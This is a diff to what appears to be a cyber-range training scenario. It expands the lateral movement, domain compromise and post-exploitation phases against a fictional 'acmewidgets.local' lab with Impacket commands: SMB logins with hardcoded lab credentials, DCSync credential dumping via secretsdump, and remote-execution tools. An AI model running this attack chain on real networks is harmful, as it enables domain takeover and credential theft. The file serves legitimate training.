@@ -141,11 +141,16 @@ events:
     delay_minutes: 30
     title: "Phase 3: Lateral Movement - File Server Access"
     description: |
-      Use extracted credentials to access the internal file server.
+      Use extracted credentials to access the internal file server with Impacket.
 
-      Commands:
+      Using impacket-smbclient (interactive):
+        impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+        # use sensitive
+        # ls
+        # cat passwords.txt
+
+      Alternative with traditional smbclient:
         smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'ls'
-        smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'get passwords.txt -'
 
       The passwords.txt file contains the Domain Administrator password.
 
@@ -153,23 +158,38 @@ events:
     delay_minutes: 45
     title: "Phase 4: Domain Compromise"
     description: |
-      Use discovered credentials to access the Domain Controller.
+      Use discovered credentials to compromise the domain with Impacket tools.
 
-      The passwords.txt file contains: Administrator / Adm1n2024!
+      Credentials from passwords.txt: Administrator / Adm1n2024!
 
-      Alternative DCSync path (limited Samba support):
+      Attempt DCSync with Impacket (svc_backup has replication rights):
         impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.12'
 
-      Note: DCSync may not work fully with Samba 4. Use the passwords.txt method.
+      Note: Samba 4 has limited DCSync support. If secretsdump fails, use the
+      Domain Admin credentials from passwords.txt directly.
+
+      Validate Domain Admin access:
+        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
 
   - sequence: 5
     delay_minutes: 60
     title: "Phase 5: Post-Exploitation"
     description: |
-      With Domain Admin credentials, access all internal systems:
-        - DC01 (172.16.2.12): Domain Controller
-        - Fileserver (172.16.2.10): Sensitive documents
-        - WS01 (172.16.2.11): Victim workstation
+      With Domain Admin credentials, demonstrate access to all internal systems
+      using Impacket tools:
+
+      File Server (172.16.2.10):
+        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.10'
+
+      Domain Controller (172.16.2.12):
+        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
+        impacket-secretsdump 'Administrator:Adm1n2024!@172.16.2.12'
+
+      Additional Impacket tools to explore:
+        impacket-psexec    - Remote command execution via SMB
+        impacket-wmiexec   - Remote command execution via WMI
+        impacket-atexec    - Remote command execution via Task Scheduler
+        impacket-reg       - Remote registry manipulation
 
       Document your attack chain for the after-action review.
 
